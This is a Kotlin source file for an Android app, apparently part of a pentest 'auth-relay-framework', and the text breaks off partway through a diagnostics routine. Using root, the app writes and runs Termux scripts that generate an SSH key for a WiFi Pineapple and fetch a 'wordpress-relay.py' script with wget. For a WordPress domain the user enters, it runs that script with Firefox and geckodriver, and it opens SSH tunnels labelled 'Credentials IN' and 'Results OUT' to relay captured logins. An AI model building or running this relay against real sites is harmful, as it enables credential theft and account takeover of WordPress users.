package com.example.wordpressrelayapp

import android.content.ActivityNotFoundException
import android.content.Intent
import android.os.Bundle
import android.widget.Button
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.OutputStreamWriter

class MainActivity : AppCompatActivity() {

    private val TERMUX_HOME = "/data/data/com.termux/files/home"
    private val TERMUX_BASH = "/data/data/com.termux/files/usr/bin/bash"
    private val SD_SCRIPT = "/sdcard/x11_start.sh"
    
    // Dynamic values to be populated
    private var termuxUid: String = ""
    private var termuxGid: String = ""
    private var termuxGroups: String = ""

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val textView = findViewById<TextView>(R.id.textView)
        textView.movementMethod = android.text.method.ScrollingMovementMethod()
        val button1 = findViewById<Button>(R.id.button1)
        val button2 = findViewById<Button>(R.id.button2)
        val button3 = findViewById<Button>(R.id.button3)
        val button4 = findViewById<Button>(R.id.button4)

        // Detect Termux UID/GID on startup
        detectTermuxIds()

        button1.setOnClickListener {
            textView.text = "Checking prerequisites..."

            Thread {
                try {
                    val (success, errorMsg) = ensureTermuxIdsDetected()
                    if (!success) {
                        runOnUiThread { 
                            textView.text = "❌ Failed to detect Termux UID/GID\n\n$errorMsg" 
                        }
                        return@Thread
                    }

                    val scriptLines = mutableListOf<String>()
                    scriptLines.add("#!/data/data/com.termux/files/usr/bin/bash")
                    scriptLines.add("set -e")
                    scriptLines.add("")
                    scriptLines.add("export HOME=/data/data/com.termux/files/home")
                    scriptLines.add("export PREFIX=/data/data/com.termux/files/usr")
                    scriptLines.add("export PATH=\"\$PREFIX/bin:\$PATH\"")
                    scriptLines.add("")
                    scriptLines.add("cd \"\$HOME\"")
                    scriptLines.add("")
                    scriptLines.add("echo 'Checking files...' > prereq_check.log")
                    scriptLines.add("")
                    scriptLines.add("if [ -f .ssh/pineapple ]; then")
                    scriptLines.add("    echo 'SSH_KEY:EXISTS'")
                    scriptLines.add("else")
                    scriptLines.add("    echo 'SSH_KEY:MISSING'")
                    scriptLines.add("fi")
                    scriptLines.add("")
                    scriptLines.add("if [ -f wordpress-relay.py ]; then")
                    scriptLines.add("    echo 'SCRIPT:EXISTS'")
                    scriptLines.add("else")
                    scriptLines.add("    echo 'SCRIPT:MISSING'")
                    scriptLines.add("fi")
                    
                    val checkScript = scriptLines.joinToString("\n")
                    val checkScriptPath = "/sdcard/check_prereqs.sh"
                    writeFileAsRoot(checkScriptPath, checkScript)
                    execAsRoot("chmod 644 $checkScriptPath")
                    
                    val checkPipeline = "cat $checkScriptPath | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
                    val checkProc = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", checkPipeline))
                    val checkOutput = BufferedReader(InputStreamReader(checkProc.inputStream)).use { it.readText() }
                    val checkError = BufferedReader(InputStreamReader(checkProc.errorStream)).use { it.readText() }
                    checkProc.waitFor()
                    
                    val sshKeyExists = checkOutput.contains("SSH_KEY:EXISTS")
                    val pythonScriptExists = checkOutput.contains("SCRIPT:EXISTS")
                    
                    if (sshKeyExists && pythonScriptExists) {
                        runOnUiThread {
                            textView.text = "✅ Private SSH Key and Relay Script Exist in Current Directory\n\nReady to proceed!"
                        }
                        return@Thread
                    }
                    
                    val statusMessage = StringBuilder()
                    statusMessage.appendLine("=== Setting Up Prerequisites ===\n")
                    
                    var needToTransferKey = false
                    
                    if (!sshKeyExists) {
                        statusMessage.appendLine("📝 Generating SSH key pair...")
                        
                        val keygenLines = mutableListOf<String>()
                        keygenLines.add("#!/data/data/com.termux/files/usr/bin/bash")
                        keygenLines.add("set -e")
                        keygenLines.add("")
                        keygenLines.add("export HOME=/data/data/com.termux/files/home")
                        keygenLines.add("export PREFIX=/data/data/com.termux/files/usr")
                        keygenLines.add("export PATH=\"\$PREFIX/bin:\$PATH\"")
                        keygenLines.add("")
                        keygenLines.add("cd \"\$HOME\"")
                        keygenLines.add("")
                        keygenLines.add("ssh-keygen -t ed25519 -f .ssh/pineapple -N ''")
                        keygenLines.add("echo 'KEYGEN:SUCCESS'")
                        
                        val keygenScript = keygenLines.joinToString("\n")
                        val keygenScriptPath = "/sdcard/generate_key.sh"
                        writeFileAsRoot(keygenScriptPath, keygenScript)
                        execAsRoot("chmod 644 $keygenScriptPath")
                        
                        val keygenPipeline = "cat $keygenScriptPath | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
                        val keygenProc = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", keygenPipeline))
                        val keygenOutput = BufferedReader(InputStreamReader(keygenProc.inputStream)).use { it.readText() }
                        val keygenError = BufferedReader(InputStreamReader(keygenProc.errorStream)).use { it.readText() }
                        keygenProc.waitFor()
                        
                        if (keygenOutput.contains("KEYGEN:SUCCESS")) {
                            statusMessage.appendLine("✅ SSH key pair generated!\n")
                            needToTransferKey = true
                        } else {
                            statusMessage.appendLine("❌ Failed to generate SSH key\n")
                            if (keygenOutput.isNotBlank()) statusMessage.appendLine("Output: $keygenOutput\n")
                            if (keygenError.isNotBlank()) statusMessage.appendLine("Error: $keygenError\n")
                        }
                    } else {
                        statusMessage.appendLine("✅ SSH key already exists\n")
                    }
                    
                    if (!pythonScriptExists) {
                        statusMessage.appendLine("📥 Downloading wordpress-relay.py...")
                        
                        val downloadLines = mutableListOf<String>()
                        downloadLines.add("#!/data/data/com.termux/files/usr/bin/bash")
                        downloadLines.add("set -e")
                        downloadLines.add("")
                        downloadLines.add("export HOME=/data/data/com.termux/files/home")
                        downloadLines.add("export PREFIX=/data/data/com.termux/files/usr")
                        downloadLines.add("export PATH=\"\$PREFIX/bin:\$PATH\"")
                        downloadLines.add("")
                        downloadLines.add("cd \"\$HOME\"")
                        downloadLines.add("")
                        downloadLines.add("wget -q https://raw.githubusercontent.com/PentestPlaybook/auth-relay-framework/refs/heads/main/wordpress/android/execution/scripts/wordpress-relay.py")
                        downloadLines.add("")
                        downloadLines.add("if [ -f wordpress-relay.py ]; then")
                        downloadLines.add("    echo 'DOWNLOAD:SUCCESS'")
                        downloadLines.add("else")
                        downloadLines.add("    echo 'DOWNLOAD:FAILED'")
                        downloadLines.add("fi")
                        
                        val downloadScript = downloadLines.joinToString("\n")
                        val downloadScriptPath = "/sdcard/download_script.sh"
                        writeFileAsRoot(downloadScriptPath, downloadScript)
                        execAsRoot("chmod 644 $downloadScriptPath")
                        
                        val downloadPipeline = "cat $downloadScriptPath | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
                        val downloadProc = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", downloadPipeline))
                        val downloadOutput = BufferedReader(InputStreamReader(downloadProc.inputStream)).use { it.readText() }
                        val downloadError = BufferedReader(InputStreamReader(downloadProc.errorStream)).use { it.readText() }
                        downloadProc.waitFor()
                        
                        if (downloadOutput.contains("DOWNLOAD:SUCCESS")) {
                            statusMessage.appendLine("✅ Python script downloaded!\n")
                        } else {
                            statusMessage.appendLine("❌ Failed to download Python script\n")
                            if (downloadOutput.isNotBlank()) statusMessage.appendLine("Output: $downloadOutput\n")
                            if (downloadError.isNotBlank()) statusMessage.appendLine("Error: $downloadError\n")
                        }
                    } else {
                        statusMessage.appendLine("✅ Python script already exists\n")
                    }
                    
                    if (needToTransferKey) {
                        statusMessage.appendLine("=" .repeat(50))
                        statusMessage.appendLine("⚠️  IMPORTANT: SSH KEY TRANSFER REQUIRED")
                        statusMessage.appendLine("=" .repeat(50))
                        statusMessage.appendLine("\nYou must transfer the public key to the Pineapple.")
                        statusMessage.appendLine("\nOpen Termux and run these commands:\n")
                        statusMessage.appendLine("scp ~/.ssh/pineapple.pub root@172.16.42.1:/root/.ssh/authorized_keys")
                        statusMessage.appendLine("\nAfter completing these steps, press Button 1 again.")
                    } else if (sshKeyExists && pythonScriptExists) {
                        statusMessage.appendLine("\n✅ All prerequisites ready!")
                        statusMessage.appendLine("You can now proceed with buttons 2, 3, and 4.")
                    } else {
                        statusMessage.appendLine("\n⚠️ Some prerequisites are missing or failed to setup.")
                        statusMessage.appendLine("Please check the error messages above.")
                    }
                    
                    runOnUiThread {
                        textView.text = statusMessage.toString()
                    }
                    
                } catch (e: Exception) {
                    runOnUiThread { textView.text = "Error: ${e.message}\n${e.stackTraceToString()}" }
                }
            }.start()
        }

        button2.setOnClickListener {
            textView.text = "Launching Termux and testing connection..."

            Thread {
                try {
                    val (success, errorMsg) = ensureTermuxIdsDetected()
                    if (!success) {
                        runOnUiThread { 
                            textView.text = "❌ Failed to detect Termux UID/GID\n\n$errorMsg" 
                        }
                        return@Thread
                    }

                    // Launch Termux to initialize environment
                    try {
                        val termuxLaunch = packageManager.getLaunchIntentForPackage("com.termux")
                            ?: Intent().apply {
                                setClassName("com.termux", "com.termux.app.TermuxActivity")
                                flags = Intent.FLAG_ACTIVITY_NEW_TASK
                            }
                        startActivity(termuxLaunch)
                        
                        Thread.sleep(2000)
                        
                        val returnIntent = Intent(this@MainActivity, MainActivity::class.java).apply {
                            flags = Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
                        }
                        startActivity(returnIntent)
                        
                        Thread.sleep(500)
                        
                    } catch (_: ActivityNotFoundException) {
                        runOnUiThread { textView.text = "❌ Termux not installed." }
                        return@Thread
                    } catch (e: Exception) {
                        runOnUiThread { textView.text = "❌ Unable to launch Termux: ${e.message}" }
                        return@Thread
                    }

                    val proc = Runtime.getRuntime().exec(arrayOf(
                        "su", termuxUid, "-c",
                        "ping -c 4 172.16.42.1"
                    ))

                    val output = BufferedReader(InputStreamReader(proc.inputStream)).use { it.readText() }
                    val error = BufferedReader(InputStreamReader(proc.errorStream)).use { it.readText() }
                    val exitCode = proc.waitFor()

                    runOnUiThread {
                        textView.text = buildString {
                            appendLine("=== Ping 172.16.42.1 (WiFi Pineapple) ===")
                            appendLine("Exit: $exitCode")
                            appendLine("")
                            if (output.isNotBlank()) {
                                appendLine(output.trim())
                            }
                            if (error.isNotBlank()) {
                                appendLine("\n=== ERROR ===")
                                appendLine(error.trim())
                            }
                            appendLine("")
                            if (exitCode == 0) {
                                appendLine("✅ Pineapple is reachable!")
                            } else {
                                appendLine("❌ Pineapple is NOT reachable")
                            }
                        }.trim()
                    }
                } catch (e: Exception) {
                    runOnUiThread { textView.text = "Error: ${e.message}" }
                }
            }.start()
        }
        
        button3.setOnClickListener {
            val input = android.widget.EditText(this)
            input.hint = "https://example.com"
            input.inputType = android.text.InputType.TYPE_TEXT_VARIATION_URI
    
            android.app.AlertDialog.Builder(this)
                .setTitle("Enter WordPress Domain")
                .setMessage("Enter the full WordPress domain URL:")
                .setView(input)
                .setPositiveButton("Start") { dialog, _ ->
                    val domain = input.text.toString().trim()
            
                    if (domain.isEmpty()) {
                        textView.text = "❌ Domain cannot be empty"
                        dialog.dismiss()
                        return@setPositiveButton
                    }
            
                    if (!domain.startsWith("http://") && !domain.startsWith("https://")) {
                        textView.text = "❌ Domain must start with http:// or https://"
                        dialog.dismiss()
                        return@setPositiveButton
                    }
            
                    textView.text = "Creating script and launching…"

                    Thread {
                        try {
                            val (success, errorMsg) = ensureTermuxIdsDetected()
                            if (!success) {
                                runOnUiThread { 
                                    textView.text = "❌ Failed to detect Termux UID/GID\n\n$errorMsg" 
                                }
                                return@Thread
                            }

                            val scriptContent = """
                                #!$TERMUX_BASH
                                set -e

                                export HOME=$TERMUX_HOME
                                export PREFIX=/data/data/com.termux/files/usr
                                export PATH="${'$'}PREFIX/bin:${'$'}PATH"
                        
                                # Critical: Set TMPDIR before anything else
                                export TMPDIR="${'$'}HOME/tmp"
                        
                                # Use TCP connection instead of Unix socket
                                export DISPLAY=:0
                        
                                # Prevent headless mode
                                unset MOZ_HEADLESS
                                export MOZ_CRASHREPORTER_DISABLE=1
                        
                                mkdir -p "${'$'}TMPDIR"

                                cd "${'$'}HOME"

                                echo "Button 3 pressed at ${'$'}(date)" > button3_test.log || true

                                # Aggressive cleanup of prior instances
                                echo "Cleaning up previous processes..." > cleanup.log
                                pkill -9 -f python.*wordpress-relay || true
                                pkill -9 -f geckodriver || true
                                pkill -9 -f firefox || true
                                pkill -9 -f termux-x11 || true
                                pkill -f 'ssh.*172.16.42.1' || true
                        
                                # Wait for ports to be released
                                echo "Waiting for ports to be released..." >> cleanup.log
                                for i in {1..10}; do
                                    if ! netstat -tuln | grep -E "(6000|4444|8080|9998)" > /dev/null 2>&1; then
                                        echo "All ports released after ${'$'}i seconds" >> cleanup.log
                                        break
                                    fi
                                    sleep 1
                                done
                        
                                # Extra wait to ensure clean state
                                sleep 2

                                # Start the X11 server with TCP listening enabled
                                echo "Starting X11 server with TCP..." > x11_output.log
                                echo "DISPLAY=${'$'}DISPLAY" >> x11_output.log
                        
                                # Start termux-x11 listening on TCP port 6000
                                termux-x11 :0 -ac -listen tcp >> x11_output.log 2>&1 &
                                X11_PID=${'$'}!
                                echo "X11 started with PID: ${'$'}X11_PID" >> x11_output.log

                                # Wait for X11 to be listening on TCP port 6000
                                X11_READY=0
                                for i in {1..30}; do
                                    if ! kill -0 ${'$'}X11_PID 2>/dev/null; then
                                        echo "ERROR: X11 process died" >> x11_output.log
                                        exit 1
                                    fi
                            
                                    # Check if port 6000 is listening
                                    if netstat -tuln | grep -q ":6000 "; then
                                        echo "✓ X11 listening on TCP port 6000 after ${'$'}i seconds" >> x11_output.log
                                        netstat -tuln | grep ":6000 " >> x11_output.log
                                        X11_READY=1
                                        break
                                    fi
                            
                                    sleep 1
                                done

                                if [ "${'$'}X11_READY" -eq 0 ]; then
                                    echo "ERROR: X11 not listening on port 6000" >> x11_output.log
                                    netstat -tuln >> x11_output.log
                                    exit 1
                                fi

                                # Extra stabilization
                                sleep 3

                                # Test Firefox connection using TCP
                                echo "Testing Firefox with DISPLAY=${'$'}DISPLAY..." >> x11_output.log
                                timeout 10 firefox --no-remote --new-instance about:blank > firefox_test.log 2>&1 &
                                FIREFOX_TEST_PID=${'$'}!
                                sleep 4
                        
                                if kill -0 ${'$'}FIREFOX_TEST_PID 2>/dev/null; then
                                    echo "✓ Firefox test SUCCESSFUL (PID: ${'$'}FIREFOX_TEST_PID)" >> x11_output.log
                                    kill ${'$'}FIREFOX_TEST_PID 2>/dev/null || true
                                    pkill -f firefox || true
                                    sleep 2
                                else
                                    echo "✗ Firefox test FAILED" >> x11_output.log
                                    cat firefox_test.log >> x11_output.log
                                fi

                                # Log environment
                                {
                                  echo "== Environment =="
                                  echo "DISPLAY=${'$'}DISPLAY"
                                  echo "TMPDIR=${'$'}TMPDIR"
                                  echo "HOME=${'$'}HOME"
                                  echo ""
                                  echo "== Network Check =="
                                  netstat -tuln | grep -E "(6000|4444|8080)" || echo "No listening ports found"
                                  echo ""
                                  echo "== Processes =="
                                  ps aux | grep -E "(termux-x11|firefox|gecko)" | grep -v grep || true
                                } > env_check.log 2>&1

                                # Start geckodriver
                                echo "Starting geckodriver..." >> x11_output.log
                                geckodriver --port 4444 --log debug > geckodriver.log 2>&1 &
                                GECKO_PID=${'$'}!
                                echo "Geckodriver PID: ${'$'}GECKO_PID" >> x11_output.log
                                sleep 3

                                if ! kill -0 ${'$'}GECKO_PID 2>/dev/null; then
                                    echo "ERROR: Geckodriver died" >> x11_output.log
                                    cat geckodriver.log >> x11_output.log
                                    exit 1
                                fi

                                # Start Python relay with user-provided domain
                                echo "Starting Python relay with domain: $domain..." >> x11_output.log
                                python "${'$'}HOME/wordpress-relay.py" --domain $domain --port 8080 > python_output.log 2>&1 &
                                PYTHON_PID=${'$'}!
                        
                                echo "=== All processes started ===" >> x11_output.log
                                echo "X11: ${'$'}X11_PID (TCP port 6000)" >> x11_output.log
                                echo "Geckodriver: ${'$'}GECKO_PID (port 4444)" >> x11_output.log
                                echo "Python: ${'$'}PYTHON_PID (port 8080, domain: $domain)" >> x11_output.log

                                # Wait for port 8080 to be ready before setting up SSH forwards
                                echo "" >> x11_output.log
                                echo "=== SSH Port Forward Setup ===" >> x11_output.log
                                echo "Waiting for port 8080 to be ready..." >> x11_output.log
                                echo 'Setting up port forwards...' > ssh_setup.log
                                
                                PORT_READY=0
                                for i in {1..30}; do
                                    if netstat -tuln | grep -q ':8080 '; then
                                        echo "✓ Port 8080 is ready after ${'$'}i seconds" >> x11_output.log
                                        echo "Port 8080 is ready after ${'$'}i seconds" >> ssh_setup.log
                                        PORT_READY=1
                                        break
                                    fi
                                    sleep 1
                                done

                                if [ "${'$'}PORT_READY" -eq 0 ]; then
                                    echo 'ERROR: Port 8080 not ready after 30 seconds' >> x11_output.log
                                    echo 'ERROR: Port 8080 not ready after 30 seconds' >> ssh_setup.log
                                    echo 'Python relay may have failed to start' >> ssh_setup.log
                                    exit 1
                                fi

                                # Kill any existing SSH tunnels
                                echo "Cleaning up old SSH tunnels..." >> ssh_setup.log
                                pkill -f 'ssh.*172.16.42.1' || true
                                sleep 2

                                # Set up SSH port forward 1: Pineapple:9999 → Android:8080
                                echo "Setting up Forward 1: Pineapple:9999 → Android:8080" >> ssh_setup.log
                                nohup ssh -i ~/.ssh/pineapple -o StrictHostKeyChecking=no -N -R 9999:localhost:8080 root@172.16.42.1 > ssh_forward1.log 2>&1 &
                                FORWARD1_PID=${'$'}!
                                echo "Forward 1 PID: ${'$'}FORWARD1_PID" >> ssh_setup.log
                                echo "Forward 1 started with PID: ${'$'}FORWARD1_PID" >> x11_output.log

                                sleep 2

                                # Set up SSH port forward 2: Android:9998 → Pineapple:80
                                echo "Setting up Forward 2: Android:9998 → Pineapple:80" >> ssh_setup.log
                                nohup ssh -i ~/.ssh/pineapple -o StrictHostKeyChecking=no -N -L 9998:172.16.42.1:80 root@172.16.42.1 > ssh_forward2.log 2>&1 &
                                FORWARD2_PID=${'$'}!
                                echo "Forward 2 PID: ${'$'}FORWARD2_PID" >> ssh_setup.log
                                echo "Forward 2 started with PID: ${'$'}FORWARD2_PID" >> x11_output.log

                                sleep 2

                                # Verify SSH tunnels are running
                                echo '' >> ssh_setup.log
                                echo '=== SSH Tunnel Status ===' >> ssh_setup.log
                                ps aux | grep 'ssh.*172.16.42.1' | grep -v grep >> ssh_setup.log || echo 'No SSH tunnels found' >> ssh_setup.log

                                echo '' >> ssh_setup.log
                                echo '=== Port Status ===' >> ssh_setup.log
                                netstat -tuln | grep -E '(8080|9998)' >> ssh_setup.log || echo 'Ports not listening yet' >> ssh_setup.log

                                echo 'SSH setup complete!' >> ssh_setup.log
                                echo "✓ SSH port forwards configured" >> x11_output.log
                                
                                echo "" >> x11_output.log
                                echo "=== COMPLETE SETUP SUMMARY ===" >> x11_output.log
                                echo "All services started and SSH tunnels established" >> x11_output.log
                                echo "X11 PID: ${'$'}X11_PID" >> x11_output.log
                                echo "Geckodriver PID: ${'$'}GECKO_PID" >> x11_output.log
                                echo "Python PID: ${'$'}PYTHON_PID" >> x11_output.log
                                echo "SSH Forward 1 PID: ${'$'}FORWARD1_PID" >> x11_output.log
                                echo "SSH Forward 2 PID: ${'$'}FORWARD2_PID" >> x11_output.log
                            """.trimIndent()

                            writeFileAsRoot(SD_SCRIPT, scriptContent)
                            execAsRoot("chmod 644 $SD_SCRIPT")

                            try {
                                val termuxLaunch = packageManager.getLaunchIntentForPackage("com.termux")
                                    ?: Intent().apply {
                                        setClassName("com.termux", "com.termux.app.TermuxActivity")
                                        flags = Intent.FLAG_ACTIVITY_NEW_TASK
                                    }
                                startActivity(termuxLaunch)
                                Thread.sleep(2000)
                            } catch (_: ActivityNotFoundException) {
                                runOnUiThread { textView.text = "Termux not installed." }
                                return@Thread
                            } catch (e: Exception) {
                                runOnUiThread { textView.text = "Unable to launch Termux (${e.message})." }
                                return@Thread
                            }

                            try {
                                val x11Launch = packageManager.getLaunchIntentForPackage("com.termux.x11")
                                    ?: Intent().apply {
                                        setClassName("com.termux.x11", "com.termux.x11.MainActivity")
                                        flags = Intent.FLAG_ACTIVITY_NEW_TASK
                                    }
                                startActivity(x11Launch)
                            } catch (_: ActivityNotFoundException) {
                                runOnUiThread { textView.text = "Termux:X11 not installed." }
                                return@Thread
                            } catch (e: Exception) {
                                runOnUiThread { textView.text = "Unable to launch Termux:X11 (${e.message})." }
                                return@Thread
                            }

                            Thread.sleep(3000)

                            val pipeline = "cat $SD_SCRIPT | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
                            val proc = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", pipeline))

                            val stdout = BufferedReader(InputStreamReader(proc.inputStream)).use { it.readText() }
                            val stderr = BufferedReader(InputStreamReader(proc.errorStream)).use { it.readText() }
                            val exit = proc.waitFor()

                            Thread.sleep(5000)

                            val readLogsScript = mutableListOf<String>()
                            readLogsScript.add("#!/data/data/com.termux/files/usr/bin/bash")
                            readLogsScript.add("set -e")
                            readLogsScript.add("")
                            readLogsScript.add("export HOME=/data/data/com.termux/files/home")
                            readLogsScript.add("export PREFIX=/data/data/com.termux/files/usr")
                            readLogsScript.add("export PATH=\"\$PREFIX/bin:\$PATH\"")
                            readLogsScript.add("")
                            readLogsScript.add("cd \"\$HOME\"")
                            readLogsScript.add("")
                            readLogsScript.add("echo '=== X11_OUTPUT_LOG ==='")
                            readLogsScript.add("cat x11_output.log 2>/dev/null || echo 'File not found'")
                            readLogsScript.add("echo ''")
                            readLogsScript.add("echo '=== CLEANUP_LOG ==='")
                            readLogsScript.add("cat cleanup.log 2>/dev/null || echo 'File not found'")
                            readLogsScript.add("echo ''")
                            readLogsScript.add("echo '=== ENV_CHECK_LOG ==='")
                            readLogsScript.add("cat env_check.log 2>/dev/null || echo 'File not found'")
                            readLogsScript.add("echo ''")
                            readLogsScript.add("echo '=== GECKODRIVER_LOG ==='")
                            readLogsScript.add("tail -20 geckodriver.log 2>/dev/null || echo 'File not found'")
                            readLogsScript.add("echo ''")
                            readLogsScript.add("echo '=== PYTHON_OUTPUT_LOG ==='")
                            readLogsScript.add("tail -20 python_output.log 2>/dev/null || echo 'File not found'")
                            readLogsScript.add("echo ''")
                            readLogsScript.add("echo '=== SSH_SETUP_LOG ==='")
                            readLogsScript.add("cat ssh_setup.log 2>/dev/null || echo 'File not found'")
                            readLogsScript.add("echo ''")
                            readLogsScript.add("echo '=== SSH_FORWARD1_LOG ==='")
                            readLogsScript.add("cat ssh_forward1.log 2>/dev/null || echo 'File not found'")
                            readLogsScript.add("echo ''")
                            readLogsScript.add("echo '=== SSH_FORWARD2_LOG ==='")
                            readLogsScript.add("cat ssh_forward2.log 2>/dev/null || echo 'File not found'")

                            val readLogsScriptContent = readLogsScript.joinToString("\n")
                            val readLogsScriptPath = "/sdcard/read_logs.sh"
                            writeFileAsRoot(readLogsScriptPath, readLogsScriptContent)
                            execAsRoot("chmod 644 $readLogsScriptPath")

                            val readPipeline = "cat $readLogsScriptPath | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
                            val readProc = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", readPipeline))
                            val allLogs = BufferedReader(InputStreamReader(readProc.inputStream)).use { it.readText() }
                            readProc.waitFor()

                            val x11LogContent = allLogs.substringAfter("=== X11_OUTPUT_LOG ===")
                                .substringBefore("=== CLEANUP_LOG ===").trim()
                            val cleanupLogContent = allLogs.substringAfter("=== CLEANUP_LOG ===")
                                .substringBefore("=== ENV_CHECK_LOG ===").trim()
                            val envCheckLogContent = allLogs.substringAfter("=== ENV_CHECK_LOG ===")
                                .substringBefore("=== GECKODRIVER_LOG ===").trim()
                            val geckodriverLogContent = allLogs.substringAfter("=== GECKODRIVER_LOG ===")
                                .substringBefore("=== PYTHON_OUTPUT_LOG ===").trim()
                            val pythonLogContent = allLogs.substringAfter("=== PYTHON_OUTPUT_LOG ===")
                                .substringBefore("=== SSH_SETUP_LOG ===").trim()
                            val sshSetupLogContent = allLogs.substringAfter("=== SSH_SETUP_LOG ===")
                                .substringBefore("=== SSH_FORWARD1_LOG ===").trim()
                            val sshForward1LogContent = allLogs.substringAfter("=== SSH_FORWARD1_LOG ===")
                                .substringBefore("=== SSH_FORWARD2_LOG ===").trim()
                            val sshForward2LogContent = allLogs.substringAfter("=== SSH_FORWARD2_LOG ===").trim()

                            runOnUiThread {
                                textView.text = buildString {
                                    appendLine("✅ Complete Setup Finished")
                                    appendLine("Script piped to Termux bash (uid $termuxUid).")
                                    appendLine("Domain: $domain")
                                    appendLine("Exit: $exit")
                                    if (stdout.isNotBlank()) appendLine("\n--- STDOUT ---\n$stdout")
                                    if (stderr.isNotBlank()) appendLine("\n--- STDERR ---\n$stderr")
                                    appendLine("\nUsing TCP connection: DISPLAY=localhost:0")
                                    appendLine("\n=== X11 & Service Logs ===")
                                    appendLine(x11LogContent)
                                    appendLine("\n=== Cleanup Log ===")
                                    appendLine(cleanupLogContent)
                                    appendLine("\n=== Environment Check ===")
                                    appendLine(envCheckLogContent)
                                    appendLine("\n=== Geckodriver Log (last 20 lines) ===")
                                    appendLine(geckodriverLogContent)
                                    appendLine("\n=== Python Output (last 20 lines) ===")
                                    appendLine(pythonLogContent)
                                    appendLine("\n=== SSH Port Forward Setup ===")
                                    appendLine("Forward 1: Pineapple:9999 → Android:8080 (Credentials IN)")
                                    appendLine("Forward 2: Android:9998 → Pineapple:80 (Results OUT)")
                                    appendLine("\n=== ssh_setup.log ===")
                                    appendLine(sshSetupLogContent)
                                    appendLine("\n=== ssh_forward1.log ===")
                                    appendLine(sshForward1LogContent)
                                    appendLine("\n=== ssh_forward2.log ===")
                                    appendLine(sshForward2LogContent)
                                    appendLine("\nAll logs available in $TERMUX_HOME")
                                    appendLine("Setup complete - all services and SSH tunnels running!")
                                }.trim()
                            }
                        } catch (e: Exception) {
                            runOnUiThread { textView.text = "Error: ${e.message}" }
                        }
                    }.start()
            
                    dialog.dismiss()
                }
                .setNegativeButton("Cancel") { dialog, _ ->
                    dialog.cancel()
                }
                .show()
        }

        button4.setOnClickListener {
            textView.text = "Running diagnostics..."

            Thread {
                try {
                    val diagnostics = StringBuilder()
                    diagnostics.appendLine("=== TERMUX DETECTION DIAGNOSTICS ===\n")
                    
                    // Step 1: Check if Termux is installed (try multiple methods)
                    diagnostics.appendLine("1. Checking if Termux is installed...")
                    
                    // Method 1: getPackageInfo
                    var termuxAppId: Int? = null
                    try {
                        val packageInfo = packageManager.getPackageInfo("com.termux", 0)
                        termuxAppId = packageInfo.applicationInfo.uid
                        diagnostics.appendLine("   ✅ Method 1 (getPackageInfo): Success")
                        diagnostics.appendLine("   Package UID: $termuxAppId\n")
                    } catch (e: Exception) {
                        diagnostics.appendLine("   ❌ Method 1 (getPackageInfo): ${e.message}")
                    }
                    
                    // Method 2: Check if Termux files exist via root
                    if (termuxAppId == null) {
                        diagnostics.appendLine("\n   Trying Method 2 (check filesystem)...")
                        try {
                            val checkProc = Runtime.getRuntime().exec(arrayOf("su", "-c", "ls -ld /data/data/com.termux"))
                            val checkOutput = BufferedReader(InputStreamReader(checkProc.inputStream)).use { it.readText() }
                            val checkExit = checkProc.waitFor()
                            
                            if (checkExit == 0 && checkOutput.isNotBlank()) {
                                diagnostics.appendLine("   ✅ Method 2: Termux directory exists")
                                diagnostics.appendLine("   Output: ${checkOutput.trim()}")
                                
                                // Try to extract UID from ls -ld output
                                // Format: drwx------ 10 u0_a321 u0_a321 4096 ...
                                val uidMatch = Regex("""u0_a(\d+)""").find(checkOutput)
                                if (uidMatch != null) {
                                    val appNum = uidMatch.groupValues[1]
                                    termuxAppId = 10000 + appNum.toInt()
                                    diagnostics.appendLine("   ✅ Extracted UID from filesystem: $termuxAppId\n")
                                }
                            } else {
                                diagnostics.appendLine("   ❌ Method 2: Directory not found or not accessible\n")
                            }
                        } catch (e: Exception) {
                            diagnostics.appendLine("   ❌ Method 2: ${e.message}\n")
                        }
                    }
                    
                    // Method 3: Read from /data/system/packages.list
                    if (termuxAppId == null) {
                        diagnostics.appendLine("   Trying Method 3 (packages.list)...")
                        try {
                            val listProc = Runtime.getRuntime().exec(arrayOf("su", "-c", "grep com.termux /data/system/packages.list"))
                            val listOutput = BufferedReader(InputStreamReader(listProc.inputStream)).use { it.readText() }
                            val listExit = listProc.waitFor()
                            
                            if (listExit == 0 && listOutput.isNotBlank()) {
                                diagnostics.appendLine("   ✅ Method 3: Found in packages.list")
                                diagnostics.appendLine("   Output: ${listOutput.trim()}")
                                
                                // Format: com.termux 10321 0 /data/user/0/com.termux ...
                                val parts = listOutput.trim().split("\\s+".toRegex())
                                if (parts.size >= 2) {
                                    termuxAppId = parts[1].toIntOrNull()
                                    diagnostics.appendLine("   ✅ Extracted UID: $termuxAppId\n")
                                }
                            } else {
                                diagnostics.appendLine("   ❌ Method 3: Not found in packages.list\n")
                            }
                        } catch (e: Exception) {
                            diagnostics.appendLine("   ❌ Method 3: ${e.message}\n")
                        }
                    }
                    
                    if (termuxAppId == null) {
                        diagnostics.appendLine("❌ TERMUX NOT DETECTED\n")
                        diagnostics.appendLine("All detection methods failed. Is Termux really installed?")
                        runOnUiThread { textView.text = diagnostics.toString() }
                        return@Thread
                    }
                    
                    // Step 2: Check root access
                    diagnostics.appendLine("2. Checking root access...")
                    try {
                        val rootProc = Runtime.getRuntime().exec(arrayOf("su", "-c", "id"))
                        val rootOutput = BufferedReader(InputStreamReader(rootProc.inputStream)).use { it.readText() }
                        val rootError = BufferedReader(InputStreamReader(rootProc.errorStream)).use { it.readText() }
                        val rootExit = rootProc.waitFor()
                        
                        if (rootExit == 0) {
                            diagnostics.appendLine("   ✅ Root access available")
                            diagnostics.appendLine("   Root id: ${rootOutput.trim()}\n")
                        } else {
                            diagnostics.appendLine("   ❌ Root command failed (exit: $rootExit)")
